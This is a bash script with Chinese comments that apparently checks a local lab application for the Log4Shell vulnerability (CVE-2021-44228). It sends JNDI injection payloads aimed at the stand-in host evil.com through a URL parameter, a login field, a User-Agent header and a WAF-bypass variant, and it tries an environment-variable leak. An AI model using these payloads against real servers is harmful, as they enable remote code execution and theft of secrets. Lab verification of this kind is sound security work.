#!/bin/bash
# Log4Shell 漏洞验证脚本

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Log4Shell (CVE-2021-44228) 验证脚本${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo -e "  ${GREEN}[✓] 端点响应${NC}"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 请求失败${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== Log4Shell 测试 ===${NC}"

test_case "基础 JNDI 注入" \
    "${BASE_URL}/log4j/vuln?token=\${jndi:ldap://evil.com/exp}"

test_case "用户登录场景" \
    "${BASE_URL}/log4j/login?username=\${jndi:ldap://evil.com/exp}&password=123"

test_case "HTTP Header 注入" \
    "${BASE_URL}/log4j/header" \
    "-H 'User-Agent: \${jndi:ldap://evil.com/exp}'"

test_case "WAF 绕过" \
    "${BASE_URL}/log4j/bypass?payload=\${lower:j}ndi:ldap://evil.com/exp}"

# 环境变量泄露
echo -e "\n${BLUE}=== 环境变量泄露 ===${NC}"
response=$(curl -s "${BASE_URL}/log4j/vuln?token=\${env:USER}" 2>/dev/null)
if echo "$response" | grep -qiE "user|root"; then
    echo -e "  ${GREEN}[✓] 环境变量泄露${NC}"
    echo "  泄露: $response"
fi

# 信息端点
echo -e "\n${YELLOW}[*] Log4j 信息端点:${NC}"
info=$(curl -s "${BASE_URL}/log4j/info" 2>/dev/null)
echo "$info" | head -10

# 总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
